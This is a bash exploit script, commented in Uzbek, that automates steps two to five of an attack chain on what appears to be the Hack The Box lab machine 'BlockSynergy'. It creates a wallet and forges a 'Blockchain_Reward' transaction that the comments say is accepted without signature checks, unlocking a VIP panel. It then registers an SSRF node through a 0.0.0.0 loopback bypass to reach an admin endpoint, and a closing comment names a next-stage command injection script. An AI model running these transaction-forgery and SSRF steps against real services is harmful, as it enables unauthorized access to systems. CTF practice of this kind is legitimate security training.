#!/usr/bin/env bash
# ============================================================
# HTB BlockSynergy — QADAM 2..5
#   wallet yaratish -> coin forge (Blockchain_Reward) -> VIP
#   -> SSRF node register (0.0.0.0) -> test_node trigger
#
# Ishlatish:
#   BASE=http://blocksynergy.htb:8080 ./02_web_chain.sh
#   (yoki default shu qiymat)
# ============================================================
set -euo pipefail

BASE="${BASE:-http://blocksynergy.htb:8080}"
WORK="${WORK:-./loot}"
mkdir -p "$WORK"
JAR="$WORK/cookies.txt"
WALLET="$WORK/wallet.json"
rm -f "$JAR"

say() { printf '\n\033[1;36m[*] %s\033[0m\n' "$*"; }

# -------------------- 2. Wallet --------------------
say "2. Wallet yaratish"
code=$(curl -sS -L -c "$JAR" -b "$JAR" -X POST \
        -F 'action=create' -F 'filename=blocksynergy' \
        -o "$WALLET" -w '%{http_code}' \
        "$BASE/dashboard/wallet")
echo "    HTTP $code  ->  $WALLET"

PUB=$(jq -r '.public_key // .publicKey // .pubkey // .address // empty' "$WALLET" 2>/dev/null | head -1 || true)
if [ -z "$PUB" ]; then
    echo "[!] public_key topilmadi — wallet.json ni ko'rib, kalit nomini to'g'rilang:"
    head -c 500 "$WALLET"; echo
    exit 1
fi
echo "    PUB = $PUB"

# -------------------- 3. Coin forging --------------------
say "3. Coin forging (sender=Blockchain_Reward, imzo tekshirilmaydi)"
jq -n --arg receiver "$PUB" \
      --arg timestamp "$(date '+%Y-%m-%d %H:%M:%S.%6N')" \
   '{ sender: "Blockchain_Reward", receiver: $receiver, amount: 100,
      signature: "Blockchain", timestamp: $timestamp }' > "$WORK/reward.json"

curl -sS -c "$JAR" -b "$JAR" \
     -H 'Content-Type: application/json' \
     --data @"$WORK/reward.json" \
     "$BASE/broadcast_transaction"
echo

# -------------------- 3.1 VIP --------------------
say "3.1 VIP panel ochilishini tekshirish"
curl -sS -L -b "$JAR" -c "$JAR" "$BASE/dashboard/vip/nodes" \
     -o "$WORK/vip.html" -w '    HTTP %{http_code}\n'

# -------------------- 4. SSRF register --------------------
say "4. SSRF: node register (0.0.0.0 loopback bypass)"
NODEURL='http://0.0.0.0:8080/admin/nodes/manage'
curl -sS -L -c "$JAR" -b "$JAR" \
     --data-urlencode 'action=register' \
     --data-urlencode "node=$NODEURL" \
     "$BASE/dashboard/vip/nodes" \
     -o "$WORK/register.html" -w '    HTTP %{http_code}\n'

# -------------------- 4.1 Node ID --------------------
say "4.1 Node ID aniqlash (ro'yxat tartibi o'zgaradi: index != ID)"
curl -sS -L -b "$JAR" -c "$JAR" "$BASE/dashboard/vip/nodes" -o "$WORK/nodes.html"

NID=$(python3 - "$WORK/nodes.html" "$NODEURL" <<'PY'
import re, html, sys
page = open(sys.argv[1], encoding='utf-8', errors='replace').read()
url  = sys.argv[2]
hits = []
for m in re.finditer(r"testNode\(\s*['\"](\d+)['\"]\s*\)", page):
    chunk = html.unescape(page[max(0, m.start()-3000):m.start()])
    if url in chunk:
        hits.append(m.group(1))
if not hits:
    ids = re.findall(r"testNode\(\s*['\"](\d+)['\"]\s*\)", page)
    hits = ids[-1:]
print(hits[-1] if hits else "")
PY
)
if [ -z "$NID" ]; then
    echo "[!] Node ID topilmadi — $WORK/nodes.html ni qo'lda ko'ring"
    exit 1
fi
echo "    NODE_ID = $NID"

# -------------------- 5. SSRF trigger --------------------
say "5. SSRF trigger: test_node/$NID"
curl -sS -b "$JAR" "$BASE/dashboard/vip/nodes/test_node/$NID" \
     -o "$WORK/ssrf.html" -w '    HTTP %{http_code}\n'

if grep -qiE 'ping|nodes/manage|Ping a target' "$WORK/ssrf.html"; then
    echo "[+] SSRF ISHLADI — admin panel kontenti qaytdi"
    echo "    Keyingi: ping_node command injection (03_cmd_injection.sh)"
else
    echo "[?] Javobni tekshiring: $WORK/ssrf.html"
fi
head -c 400 "$WORK/ssrf.html"; echo
